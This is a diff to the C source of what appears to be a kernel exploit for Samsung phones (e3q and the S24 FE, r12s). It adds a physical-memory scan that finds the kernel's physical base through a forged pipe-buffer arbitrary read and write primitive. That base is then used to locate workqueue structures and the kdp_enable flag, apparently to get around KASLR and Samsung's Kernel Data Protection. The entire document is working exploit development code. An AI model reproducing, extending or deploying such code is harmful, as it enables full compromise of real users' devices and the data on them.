@@ -255,6 +255,10 @@ static int g_cpu = CPU_TRIG;
 static unsigned long long g_base;
 static unsigned long long g_slide;
 static int g_slide_set;
+
+/* 物理地址换算（RMS_PHYS_SCAN 时在 umh 阶段发现 g_kphys_base） */
+static unsigned long long static_phys(unsigned long long sym_static);
+static unsigned long long runtime_phys(unsigned long long va);
 static int g_held;
 static unsigned long long g_pipe_addr;
 
@@ -2229,9 +2233,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
             }
             else
             {
-                unsigned long long phys =
-                    KERNEL_PHYS_LOAD + g_slide +
-                    (SYSTEM_UNBOUND_WQ_STATIC - KERNEL_VA_BASE);
+                unsigned long long phys = static_phys(SYSTEM_UNBOUND_WQ_STATIC);
                 unsigned long long pfn = phys >> 12;
 
                 spage = VMEMMAP_BASE +
@@ -2990,6 +2992,7 @@ static void user_buf_set(unsigned char *page, unsigned long long spage,
     *(unsigned int *)(b + 0x18) = flags;
 }
 
+
 static int user_pipe_read(int fd, unsigned char *page,
                           unsigned long long addr, void *buf, size_t len)
 {
@@ -3022,6 +3025,88 @@ static int user_pipe_read(int fd, unsigned char *page,
     return (int)got;
 }
 
+#ifndef RMS_PHYS_SCAN
+#define RMS_PHYS_SCAN 0
+#endif
+
+/*
+ * Kernel image physical base for this boot.
+ *
+ * The plain payload assumes phys = KERNEL_PHYS_LOAD + slide + (sym - KERNEL_VA_BASE),
+ * i.e. the bootloader places the image at KERNEL_PHYS_LOAD and the physical KASLR
+ * slide equals the virtual one.  That holds on e3q but NOT on r12s (S24 FE):
+ * there the readback of SYSTEM_UNBOUND_WQ_STATIC returns garbage, i.e. the assumed
+ * physical base is wrong.
+ *
+ * With RMS_PHYS_SCAN the payload discovers the base instead of trusting it: scan
+ * 2MB-aligned physical candidates, read the candidate wq pointer, then verify the
+ * chain wq->dfl_pwq->pool and pool->worklist.  Only a real workqueue_struct passes.
+ *
+ * After the scan, phys(sym) = g_kphys_base + (sym - KERNEL_VA_BASE), where
+ * g_kphys_base is the physical address of KERNEL_VA_BASE + slide.
+ */
+static unsigned long long g_kphys_base;
+
+#if RMS_PHYS_SCAN
+static unsigned long long rms_find_kphys(int fd, unsigned char *page,
+                                         unsigned long long delta)
+{
+    unsigned char kb[0x200];
+    unsigned long long p, wq, pwq, pool, wqval;
+    int hits = 0;
+
+    for (p = 0x80000000ULL; p < 0xd0000000ULL; p += 0x200000ULL)
+    {
+        if (user_pipe_read(fd, page, LINEAR_MAP_BASE + p, &wq, 8) != 8)
+            continue;
+        if (wq < LINEAR_MAP_BASE || wq >= 0xffffffc000000000ULL || (wq & 7))
+            continue;
+        if (user_pipe_read(fd, page, wq, kb, 0x200) != 0x200)
+            continue;
+        pwq = *(unsigned long long *)(kb + 0xb0);
+        if (pwq < LINEAR_MAP_BASE || pwq >= 0xffffffc000000000ULL || (pwq & 7))
+            continue;
+        if (user_pipe_read(fd, page, pwq, kb, 0x100) != 0x100)
+            continue;
+        pool = *(unsigned long long *)(kb + 0x00);
+        wqval = *(unsigned long long *)(kb + 0x08);
+        if (wqval != wq || pool < LINEAR_MAP_BASE ||
+            pool >= 0xffffffc000000000ULL)
+            continue;
+        if (user_pipe_read(fd, page, pool, kb, 0x80) != 0x80)
+            continue;
+        if (*(unsigned long long *)(kb + POOL_WORKLIST_OFF) < LINEAR_MAP_BASE ||
+            *(unsigned long long *)(kb + POOL_WORKLIST_OFF + 8) < LINEAR_MAP_BASE)
+            continue;
+        if (++hits > 1)
+            logf("[!] phys base scan: multiple candidates, keeping first\n");
+        if (hits == 1)
+        {
+            g_kphys_base = p - delta;
+            logf("[+] phys base scan p=%#llx base=%#llx wq=%#llx pwq=%#llx "
+                 "pool=%#llx\n", p, g_kphys_base, wq, pwq, pool);
+        }
+    }
+    return g_kphys_base;
+}
+#endif
+
+/* phys address of a static kernel symbol; valid after g_kphys_base is known. */
+static unsigned long long static_phys(unsigned long long sym_static)
+{
+    if (g_kphys_base)
+        return g_kphys_base + (sym_static - KERNEL_VA_BASE);
+    return KERNEL_PHYS_LOAD + g_slide + (sym_static - KERNEL_VA_BASE);
+}
+
+/* phys address of a *runtime* kernel-image VA (static symbol + slide). */
+static unsigned long long runtime_phys(unsigned long long va)
+{
+    if (g_kphys_base)
+        return g_kphys_base + (va - KERNEL_VA_BASE - g_slide);
+    return KERNEL_PHYS_LOAD + (va - KERNEL_VA_BASE);
+}
+
 static int user_pipe_write(int fd, unsigned char *page,
                            unsigned long long addr, const void *buf,
                            size_t len)
@@ -3035,7 +3120,7 @@ static int user_pipe_write(int fd, unsigned char *page,
 
     if (addr >= KERNEL_VA_BASE && addr < KERNEL_VA_BASE + 0x4000000ULL)
     {
-        phys = KERNEL_PHYS_LOAD + (addr - KERNEL_VA_BASE);
+        phys = runtime_phys(addr);
         addr = LINEAR_MAP_BASE + phys;
     }
     if (addr < LINEAR_MAP_BASE || addr >= 0xffffffc000000000ULL)
@@ -3516,8 +3601,12 @@ int main(int argc, char **argv)
                 park_forever("umh pipe bufs bootstrap failed");
 
             /* All following operations use the user-page fake buffer. */
-            sym_phys = KERNEL_PHYS_LOAD + g_slide +
-                       (SYSTEM_UNBOUND_WQ_STATIC - KERNEL_VA_BASE);
+            #if RMS_PHYS_SCAN
+              if (!rms_find_kphys(pf[0], mark,
+                                  SYSTEM_UNBOUND_WQ_STATIC - KERNEL_VA_BASE))
+                  park_forever("umh phys base scan failed");
+#endif
+              sym_phys = static_phys(SYSTEM_UNBOUND_WQ_STATIC);
             sym_alias = LINEAR_MAP_BASE + sym_phys;
             if (user_pipe_read(pf[0], mark, sym_alias, &wq, 8) != 8)
                 park_forever("umh wq slot read failed");
@@ -4022,8 +4111,7 @@ int main(int argc, char **argv)
          */
         {
             unsigned long long kdp_alias =
-                g_base + KERNEL_PHYS_LOAD + g_slide +
-                (KDP_ENABLE_STATIC - KERNEL_VA_BASE);
+                  g_base + static_phys(KDP_ENABLE_STATIC);
 
             logf("[+] kdp_enable alias=%#llx (g_base=%#llx)\n",
                  kdp_alias, g_base);
